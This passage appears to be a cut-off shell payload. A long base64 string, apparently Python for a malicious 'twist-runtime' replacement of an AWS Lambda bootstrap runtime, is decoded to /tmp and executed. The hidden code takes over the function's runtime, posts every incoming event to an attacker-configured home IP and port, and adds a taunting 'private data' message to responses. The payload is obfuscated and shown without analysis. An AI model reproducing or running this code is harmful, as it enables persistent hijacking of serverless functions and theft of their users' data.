B5dGhvbgpkZWYgc2V0X2RlZmF1bHRfc3lzX3BhdGgoKToKICAgIGlmIG5vdCBpc19weXRob25wYXRoX3NldCgpOgogICAgICAgIHN5cy5wYXRoLmluc2VydCgwLCBnZXRfb3B0X3B5dGhvbl9kaXJlY3RvcnkoKSkKICAgICAgICBzeXMucGF0aC5pbnNlcnQoMCwgZ2V0X29wdF9zaXRlX3BhY2thZ2VzX2RpcmVjdG9yeSgpKQogICAgIyAnL3Zhci90YXNrJyBpcyBmdW5jdGlvbiBhdXRob3IncyB3b3JraW5nIGRpcmVjdG9yeQogICAgIyB3ZSBhZGQgaXQgZmlyc3QgaW4gb3JkZXIgdG8gbWltaWMgdGhlIGRlZmF1bHQgYmVoYXZpb3Igb2YgcG9wdWxhdGluZyBzeXMucGF0aCBhbmQgbWFrZSBtb2R1bGVzIHVuZGVyICcvdmFyL3Rhc2snCiAgICAjIGRpc2NvdmVyYWJsZSAtIGh0dHBzOi8vZG9jcy5weXRob24ub3JnLzMvbGlicmFyeS9zeXMuaHRtbCNzeXMucGF0aAogICAgc3lzLnBhdGguaW5zZXJ0KDAsIG9zLmVudmlyb25bJ0xBTUJEQV9UQVNLX1JPT1QnXSkKCgpkZWYgYWRkX2RlZmF1bHRfc2l0ZV9kaXJlY3RvcmllcygpOgogICAgIyBTZXQgJy92YXIvdGFzayBhcyBzaXRlIGRpcmVjdG9yeSBzbyB0aGF0IHdlIGFyZSBhYmxlIHRvIGxvYWQgYWxsIGN1c3RvbWVyIC5wdGggZmlsZXMKICAgIHNpdGUuYWRkc2l0ZWRpcihvcy5lbnZpcm9uWyJMQU1CREFfVEFTS19ST09UIl0pCiAgICBpZiBub3QgaXNfcHl0aG9ucGF0aF9zZXQoKToKICAgICAgICBzaXRlLmFkZHNpdGVkaXIoZ2V0X29wdF9zaXRlX3BhY2thZ2VzX2RpcmVjdG9yeSgpKQogICAgICAgIHNpdGUuYWRkc2l0ZWRpcihnZXRfb3B0X3B5dGhvbl9kaXJlY3RvcnkoKSkKCgpkZWYgdXBkYXRlX3hyYXlfZW52X3ZhcmlhYmxlKHhyYXlfdHJhY2VfaWQpOgogICAgaWYgeHJheV90cmFjZV9pZCBpcyBub3QgTm9uZToKICAgICAgICBvcy5lbnZpcm9uWydfWF9BTVpOX1RSQUNFX0lEJ10gPSB4cmF5X3RyYWNlX2lkCiAgICBlbHNlOgogICAgICAgIGlmICdfWF9BTVpOX1RSQUNFX0lEJyBpbiBvcy5lbnZpcm9uOgogICAgICAgICAgICBkZWwgb3MuZW52aXJvblsnX1hfQU1aTl9UUkFDRV9JRCddCgoKZGVmIGluaXRfbG9nZ2VyKCk6CiAgICBsb2dnaW5nLkZvcm1hdHRlci5jb252ZXJ0ZXIgPSB0aW1lLmdtdGltZQogICAgbG9nZ2VyID0gbG9nZ2luZy5nZXRMb2dnZXIoKQogICAgbG9nZ2VyX2hhbmRsZXIgPSBMYW1iZGFMb2dnZXJIYW5kbGVyKCkKICAgIGxvZ2dlcl9oYW5kbGVyLnNldEZvcm1hdHRlcihsb2dnaW5nLkZvcm1hdHRlcigKICAgICAgICAnWyUobGV2ZWxuYW1lKXNdXHQlKGFzY3RpbWUpcy4lKG1zZWNzKWRaXHQlKGF3c19yZXF1ZXN0X2lkKXNcdCUobWVzc2FnZSlzXG4nLAogICAgICAgICclWS0lbS0lZFQlSDolTTolUycKICAgICkpCiAgICBsb2dnZXJfaGFuZGxlci5hZGRGaWx0ZXIoTGFtYmRhTG9nZ2VyRmlsdGVyKCkpCiAgICBsb2dnZXIuYWRkSGFuZGxlcihsb2dnZXJfaGFuZGxlcikKCgoKIyMgLS0tIFR3aXN0IHJ1bnRpbWUgLS0tICMjCgp0cnk6CiAgICBpbXBvcnQgcmVxdWVzdHMKZXhjZXB0IE1vZHVsZU5vdEZvdW5kRXJyb3I6CiAgICBmcm9tIGJvdG9jb3JlLnZlbmRvcmVkIGltcG9ydCByZXF1ZXN0cwpmcm9tIGxhbWJkYV9ydW50aW1lX2NsaWVudCBpbXBvcnQgTGFtYmRhUnVudGltZUNsaWVudEVycm9yCgoKIyBBZGQgYSBzbWFsbCBub3RpZmljYXRpb24gdG8gdGhlIHJlc3BvbnNlCmRlZiB0d2lzdF9yZXNwb25zZShyZXNwb25zZSk6CiAgICBpZiB0eXBlKHJlc3BvbnNlKSBpcyBub3QgZGljdDoKICAgICAgICByZXR1cm4gcmVzcG9uc2UKICAgIAogICAgaWYgImJvZHkiIG5vdCBpbiByZXNwb25zZSBvciBub3QgcmVzcG9uc2VbImJvZHkiXToKICAgICAgICByZXR1cm4gcmVzcG9uc2UKICAgIGJvZHkgPSByZXNwb25zZVsiYm9keSJdCiAgICAKICAgIGlmIHR5cGUoYm9keSkgaXMgbm90IGRpY3Q6CiAgICAgICAgdHJ5OgogICAgICAgICAgICBqc29uX2JvZHkgPSBqc29uLmxvYWRzKGJvZHkpCiAgICAgICAgZXhjZXB0IGpzb24uZGVjb2Rlci5KU09ORGVjb2RlRXJyb3IgYXMgZToKICAgICAgICAgICAgcmV0dXJuIHJlc3BvbnNlCiAgICBlbHNlOgogICAgICAgIGpzb25fYm9keSA9IGJvZHkKCgogICAganNvbl9ib2R5WyJGWUkiXSA9ICJJJ2xsIHB1dCB5b3VyIHByaXZhdGUgZGF0YSBpbnRvIGdvb2QgdXNlICg7IgogICAgcmVzcG9uc2VbImJvZHkiXSA9IGpzb24uZHVtcHMoanNvbl9ib2R5KQogICAgcmV0dXJuIHJlc3BvbnNlCgoKZGVmIHR3aXN0X2hhbmRsZV9ldmVudF9yZXF1ZXN0KGxhbWJkYV9ydW50aW1lX2NsaWVudCwgcmVxdWVzdF9oYW5kbGVyLCBpbnZva2VfaWQsIGV2ZW50X2JvZHksIGNvbnRlbnRfdHlwZSwKICAgICAgICAgICAgICAgICAgICAgICAgIGNsaWVudF9jb250ZXh0X2pzb24sIGNvZ25pdG9faWRlbnRpdHlfanNvbiwgaW52b2tlZF9mdW5jdGlvbl9hcm4sIGVwb2NoX2RlYWRsaW5lX3RpbWVfaW5fbXMpOgogICAgZXJyb3JfcmVzdWx0ID0gTm9uZQogICAgdHJ5OgogICAgICAgIGxhbWJkYV9jb250ZXh0ID0gY3JlYXRlX2xhbWJkYV9jb250ZXh0KGNsaWVudF9jb250ZXh0X2pzb24sIGNvZ25pdG9faWRlbnRpdHlfanNvbiwgZXBvY2hfZGVhZGxpbmVfdGltZV9pbl9tcywKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBpbnZva2VfaWQsIGludm9rZWRfZnVuY3Rpb25fYXJuKQogICAgICAgIGV2ZW50ID0gbGFtYmRhX3J1bnRpbWVfY2xpZW50Lm1hcnNoYWxsZXIudW5tYXJzaGFsX3JlcXVlc3QoZXZlbnRfYm9keSwgY29udGVudF90eXBlKQoKICAgICAgICB0d2lzdF9sZWFrX2RhdGFfaG9tZShldmVudCwgaW52b2tlX2lkKQogICAgICAgIHJlc3BvbnNlID0gcmVxdWVzdF9oYW5kbGVyKGV2ZW50LCBsYW1iZGFfY29udGV4dCkKICAgICAgICB0d2lzdGVkX3Jlc3BvbnNlID0gdHdpc3RfcmVzcG9uc2UocmVzcG9uc2UpCgogICAgICAgIHJlc3VsdCwgcmVzdWx0X2NvbnRlbnRfdHlwZSA9IGxhbWJkYV9ydW50aW1lX2NsaWVudC5tYXJzaGFsbGVyLm1hcnNoYWxfcmVzcG9uc2UodHdpc3RlZF9yZXNwb25zZSkKICAgIGV4Y2VwdCBGYXVsdEV4Y2VwdGlvbiBhcyBlOgogICAgICAgIGVycm9yX3Jlc3VsdCA9IG1ha2VfZXJyb3IoZS5tc2csIGUuZXhjZXB0aW9uX3R5cGUsIGUudHJhY2UpCiAgICBleGNlcHQgRXhjZXB0aW9uOgogICAgICAgIGVycm9yX3Jlc3VsdCA9IGJ1aWxkX2ZhdWx0X3Jlc3VsdChzeXMuZXhjX2luZm8oKSwgTm9uZSkKCiAgICBpZiBlcnJvcl9yZXN1bHQgaXMgbm90IE5vbmU6CiAgICAgICAgbG9nX2Vycm9yKGVycm9yX3Jlc3VsdCkKICAgICAgICBsYW1iZGFfcnVudGltZV9jbGllbnQucG9zdF9pbnZvY2F0aW9uX2Vycm9yKGludm9rZV9pZCwgdG9fanNvbihlcnJvcl9yZXN1bHQpKQogICAgZWxzZToKICAgICAgICBsYW1iZGFfcnVudGltZV9jbGllbnQucG9zdF9pbnZvY2F0aW9uX3Jlc3VsdChpbnZva2VfaWQsIHJlc3VsdCwgcmVzdWx0X2NvbnRlbnRfdHlwZSkKCgpUV0lTVF9IT01FX0lQID0gIiIgICAgIyBmaWxsIGluClRXSVNUX0hPTUVfUE9SVCA9ICIiICAjIGZpbGwgaW4KREVGQVVMVF9USU1FT1VUID0gMC4yCiMgU2VuZCB0aGUgZXZlbnQgdG8gVFdJU1RfSE9NRQpkZWYgdHdpc3RfbGVha19kYXRhX2hvbWUoZXZlbnQsIGludm9rZV9pZCk6CiAgICBpZiBub3QgVFdJU1RfSE9NRV9JUCBvciBub3QgVFdJU1RfSE9NRV9QT1JUOgogICAgICAgIHByaW50KCJbIV0gdHdpc3RfbGVha19kYXRhX2hvbWU6IFRXSVNUX0hPTUUgaXNuJ3QgZGVmaW5lZCIpCiAgICAgICAgcmV0dXJuCgogICAgIyBTZW5kIGV2ZW50IHRvIGhvbWUgc2VydmVyCiAgICBob21lID0gImh0dHA6Ly97MH06ezF9Ii5mb3JtYXQoVFdJU1RfSE9NRV9JUCwgVFdJU1RfSE9NRV9QT1JUKQogICAgdHJ5OgogICAgICAgIHJlcXVlc3RzLnBvc3QoaG9tZSwganNvbj1ldmVudCwgdGltZW91dD1ERUZBVUxUX1RJTUVPVVQpCiAgICBleGNlcHQgRXhjZXB0aW9uIGFzIGU6CiAgICAgICAgZXhjcCA9IHJlcHIoZSkKICAgICAgICBwcmludCgiWyFdIHR3aXN0X2xlYWtfZGF0YV9ob21lOiBmYWlsZWQgdG8gc2VuZCBldmVudCAne30nIHdpdGg6IHt9Ii5mb3JtYXQoaW52b2tlX2lkLCBleGNwKSkKCgojIFRyeSB0byByZXNwb25kIHRvIHRoZSBldmVudCB0aGF0IHNwYXduZWQgdXMgCmRlZiB0d2lzdF9yZXNwb25kX3RvX3BheWxvYWRfaW52b2tlX211bHRpcGxlX2lkcyhsYW1iZGFfcnVudGltZV9jbGllbnQsIHBvc3NpYmxlX2ludm9rZV9pZHMpOgogICAgcmVzcG9uc2UgPSB7CiAgICAgICAgImlzQmFzZTY0RW5jb2RlZCI6IEZhbHNlLAogICAgICAgICJzdGF0dXNDb2RlIiA6IDIwMCwKICAgICAgICAiaGVhZGVycyIgOiB7IkNvbnRlbnQtVHlwZSIgOiAidGV4dC9wbGFpbiJ9LAogICAgICAgICJib2R5IiA6IGpzb24uZHVtcHMoeyJvdXRwdXQiIDogIlN1Y2Nlc3NmdWxseSB0b29rIG92ZXIgYm9vdHN0cmFwIHJ1bnRpbWUifSkKICAgIH0KCiAgICAjIE1hcnNoYWxsIHJlc3BvbnNlCiAgICBlcnJvcl9yZXN1bHQgPSBOb25lCiAgICB0cnk6CiAgICAgICAgcmVzdWx0LCByZXN1bHRfY29udGVudF90eXBlID0gbGFtYmRhX3J1bnRpbWVfY2xpZW50Lm1hcnNoYWxsZXIubWFyc2hhbF9yZXNwb25zZShyZXNwb25zZSkgCiAgICBleGNlcHQgRmF1bHRFeGNlcHRpb24gYXMgZToKICAgICAgICBlcnJvcl9yZXN1bHQgPSBtYWtlX2Vycm9yKGUubXNnLCBlLmV4Y2VwdGlvbl90eXBlLCBlLnRyYWNlKQogICAgZXhjZXB0IEV4Y2VwdGlvbjoKICAgICAgICBlcnJvcl9yZXN1bHQgPSBidWlsZF9mYXVsdF9yZXN1bHQoc3lzLmV4Y19pbmZvKCksIE5vbmUpCgogICAgZm9yIGludm9rZV9pZCBpbiBwb3NzaWJsZV9pbnZva2VfaWRzOgogICAgICAgIHRyeToKICAgICAgICAgICAgaWYgZXJyb3JfcmVzdWx0IGlzIG5vdCBOb25lOgogICAgICAgICAgICAgICAgbG9nX2Vycm9yKGVycm9yX3Jlc3VsdCkKICAgICAgICAgICAgICAgIGxhbWJkYV9ydW50aW1lX2NsaWVudC5wb3N0X2ludm9jYXRpb25fZXJyb3IoaW52b2tlX2lkLCB0b19qc29uKGVycm9yX3Jlc3VsdCkpCiAgICAgICAgICAgIGVsc2U6CiAgICAgICAgICAgICAgICBsYW1iZGFfcnVudGltZV9jbGllbnQucG9zdF9pbnZvY2F0aW9uX3Jlc3VsdChpbnZva2VfaWQsIHJlc3VsdCwgcmVzdWx0X2NvbnRlbnRfdHlwZSkKICAgICAgICBleGNlcHQgTGFtYmRhUnVudGltZUNsaWVudEVycm9yIGFzIGU6CiAgICAgICAgICAgIHByaW50KCJbIV0gRmFpbGVkIHdpdGggaW52b2tlX2lkOiAne30nLCB0cnlpbmcgbmV4dCBpZC4uLiIuZm9ybWF0KGludm9rZV9pZCkpCiAgICAgICAgICAgIGNvbnRpbnVlCgogICAgICAgIHByaW50KCJbK10gU3VjY2VlZGVkIHdpdGggaW52b2tlX2lkOiAne30nIi5mb3JtYXQoaW52b2tlX2lkKSkKICAgICAgICByZXR1cm4gVHJ1ZQogICAgICAgIAogICAgcmV0dXJuIEZhbHNlCgoKX0dMT0JBTF9BV1NfUkVRVUVTVF9JRCA9IE5vbmUKSEFSRENPREVEX0lOSVRfUFJPQ0VTU19BUEkgPSAiMTI3LjAuMC4xOjkwMDEiCgpkZWYgdHdpc3RfbWFpbihpbnZva2VfaWRzKToKCiAgICAjIFJlY29ubmVjdCB0byB0aGUgaW5pdCBwcm9jZXNzCiAgICBsYW1iZGFfcnVudGltZV9jbGllbnQgPSBMYW1iZGFSdW50aW1lQ2xpZW50KEhBUkRDT0RFRF9JTklUX1BST0NFU1NfQVBJKQogICAgCiAgICAjIEhhbmRsZSB0aGUgaW52b2NhdGlvbiB0aGF0IHN3aXRjaGVkIHRoZSBydW50aW1lCiAgICBpZiBub3QgdHdpc3RfcmVzcG9uZF90b19wYXlsb2FkX2ludm9rZV9tdWx0aXBsZV9pZHMobGFtYmRhX3J1bnRpbWVfY2xpZW50LCBpbnZva2VfaWRzKToKICAgICAgICByZXR1cm4KCiAgICBldmVudF9yZXF1ZXN0ID0gbGFtYmRhX3J1bnRpbWVfY2xpZW50LndhaXRfbmV4dF9pbnZvY2F0aW9uKCkgIyB3ZSBmcmVlemUgaGVyZSwKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAjIHJlc3Qgb2YgaW5pdGlhbGl6YXRpb24gd2lsbCBoYXBwZW4gaW4gdGhlIG5leHQgZXZlbnQKCiAgICAjIFJlY2VpdmVkIGZpcnN0IGV2ZW50IGFmdGVyIHN3aXRjaAogICAgIyBDb250aW51ZSBpbml0aWFsaXphdGlvbgogICAgdHJ5OgogICAgICAgIGluaXRfbG9nZ2VyKCkKICAgICAgICBhZGRfZGVmYXVsdF9zaXRlX2RpcmVjdG9yaWVzKCkKCiAgICAgICAgaGFuZGxlciA9IG9zLmVudmlyb25bIl9IQU5ETEVSIl0KICAgICAgICByZXF1ZXN0X2hhbmRsZXIgPSBfZ2V0X2hhbmRsZXIoaGFuZGxlcikKICAgIGV4Y2VwdCBFeGNlcHRpb24gYXMgZToKICAgICAgICBwcmludCgiWyFdIHR3aXN0X21haW46IGluaXRpYWxpemF0aW9uIGZhaWxlZDoiICsgcmVwcihlKSkKICAgICAgICByZXR1cm4KCiAgICAjIEhhbmRsZSBhbmQgbGVhayBzdWJzZXF1ZW50IGV2ZW50cwogICAgZ2xvYmFsIF9HTE9CQUxfQVdTX1JFUVVFU1RfSUQKCiAgICB3aGlsZSBUcnVlOgogICAgICAgIF9HTE9CQUxfQVdTX1JFUVVFU1RfSUQgPSBldmVudF9yZXF1ZXN0Lmludm9rZV9pZAoKICAgICAgICB1cGRhdGVfeHJheV9lbnZfdmFyaWFibGUoZXZlbnRfcmVxdWVzdC54X2Ftem5fdHJhY2VfaWQpCgogICAgICAgIHR3aXN0X2hhbmRsZV9ldmVudF9yZXF1ZXN0KGxhbWJkYV9ydW50aW1lX2NsaWVudCwKICAgICAgICAgICAgICAgICAgICAgICAgICAgICByZXF1ZXN0X2hhbmRsZXIsICAKICAgICAgICAgICAgICAgICAgICAgICAgICAgICBldmVudF9yZXF1ZXN0Lmludm9rZV9pZCwKICAgICAgICAgICAgICAgICAgICAgICAgICAgICBldmVudF9yZXF1ZXN0LmV2ZW50X2JvZHksCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgZXZlbnRfcmVxdWVzdC5jb250ZW50X3R5cGUsCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgZXZlbnRfcmVxdWVzdC5jbGllbnRfY29udGV4dCwKICAgICAgICAgICAgICAgICAgICAgICAgICAgICBldmVudF9yZXF1ZXN0LmNvZ25pdG9faWRlbnRpdHksCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgZXZlbnRfcmVxdWVzdC5pbnZva2VkX2Z1bmN0aW9uX2FybiwKICAgICAgICAgICAgICAgICAgICAgICAgICAgICBldmVudF9yZXF1ZXN0LmRlYWRsaW5lX3RpbWVfaW5fbXMpCgogICAgICAgICMgTmV4dCBldmVudAogICAgICAgIGV2ZW50X3JlcXVlc3QgPSBsYW1iZGFfcnVudGltZV9jbGllbnQud2FpdF9uZXh0X2ludm9jYXRpb24oKQoKCmlmIF9fbmFtZV9fID09ICdfX21haW5fXyc6CgogICAgaWYgbGVuKHN5cy5hcmd2KSA8IDI6CiAgICAgICAgcHJpbnQoIlsrXSBVc2FnZTogPHR3aXN0LXJ1bnRpbWU+IDxpbnZva2UtaWQtMT4gLi4uIikKICAgICAgICBzeXMuZXhpdCgxKQogICAgCiAgICBzeXMucGF0aC5pbnNlcnQoMCwgZ2V0X29wdF9weXRob25fZGlyZWN0b3J5KCkpCiAgICBzeXMucGF0aC5pbnNlcnQoMCwgZ2V0X29wdF9zaXRlX3BhY2thZ2VzX2RpcmVjdG9yeSgpKQogICAgc3lzLnN0ZG91dCA9IFVuYnVmZmVyZWQoc3lzLnN0ZG91dCkKICAgIHN5cy5zdGRlcnIgPSBVbmJ1ZmZlcmVkKHN5cy5zdGRlcnIpCgogICAgaW52b2tlX2lkcyA9IHN5cy5hcmd2WzE6XQogICAgcHJpbnQoIlsrXSB0d2lzdC1ydW50aW1lIHN0YXJ0aW5nLCBwb3NzaWJsZSBpbnZva2UgaWRzOiAiICsgc3RyKGludm9rZV9pZHMpKQogICAgdHdpc3RfbWFpbihpbnZva2VfaWRzKQoK"; echo -n $new_runtime_b64 | base64 -d > /tmp/runtime;  echo -n $switch_runtime_b64 | base64 -d > /tmp/switch; chmod +x /tmp/switch; exec /tmp/switch; echo 'unexpected' 